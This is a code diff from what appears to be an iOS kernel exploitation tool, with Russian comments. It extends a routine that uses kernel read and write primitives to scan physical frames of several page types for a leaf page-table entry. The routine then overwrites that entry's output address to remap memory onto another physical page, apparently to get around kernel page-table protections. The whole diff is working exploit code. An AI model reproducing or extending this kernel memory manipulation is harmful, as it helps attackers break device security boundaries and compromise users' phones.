@@ -2909,26 +2909,30 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                     uint64_t slotVA = sacVA + uoff;
                     uint64_t slotSave = early_kread64(slotVA);
                     early_kwrite64(slotVA, 0);
-                    // ищем PTE, мапящий ucPA, на 0x21-страницах
-                    uint64_t pteVA = 0, pteSave = 0;
+                    // 2.0.74: ищем PTE на ВСЕХ типах, пишем тип
+                    uint64_t pteVA = 0, pteSave = 0; int pteType = -1;
+                    uint32_t nScan = 0, nCand = 0;
                     for (uint64_t pa = wB; pa < wB + wS && !pteVA; pa += 0x4000) {
-                        if (kpFrameTypeOf(pa) != 0x21) continue;
+                        int t = kpFrameTypeOf(pa);
+                        if (t != 0x21 && t != 0x15 && t != 0x0b && t != 0x18) continue;
                         uint64_t al = phystokv(pa);
                         if (!al) continue;
+                        nScan++;
                         for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
                             uint64_t q = early_kread64(al + o);
                             if ((q & 3) != 3) continue;
                             uint64_t oa = q & 0x0000ffffffffc000ULL;
                             if (oa == (ucPA & ~0x3fffULL)) {
-                                pteVA = al + o;
-                                pteSave = q;
-                                kpNote(r, [NSString stringWithFormat:@"  [PTE] ★ leaf-PTE at %#llx = %#018llx (oa=%#llx)",
-                                          (unsigned long long)pteVA, (unsigned long long)q, (unsigned long long)oa]);
+                                pteVA = al + o; pteSave = q; pteType = t;
+                                kpNote(r, [NSString stringWithFormat:@"  [PTE] ★ leaf-PTE at %#llx = %#018llx (oa=%#llx) type=%d",
+                                          (unsigned long long)pteVA, (unsigned long long)q, (unsigned long long)oa, t]);
                                 break;
                             }
+                            if ((q & 3) == 3 && (q & 0x0000ffffffffc000ULL) != 0) nCand++;
                         }
                     }
-                    if (pteVA) {
+                    kpNote(r, [NSString stringWithFormat:@"  [PTE] scanned=%u pte-cands=%u found=%d", nScan, nCand, pteVA ? 1 : 0]);
+                    if (pteVA && (pteType == 0x21 || pteType == 0x15)) {
                         // подменяем OA на sacPA, сохраняем флаги
                         uint64_t newPte = (pteSave & ~0x0000ffffffffc000ULL) | (sacPA & 0x0000ffffffffc000ULL);
                         early_kwrite64(pteVA, newPte);
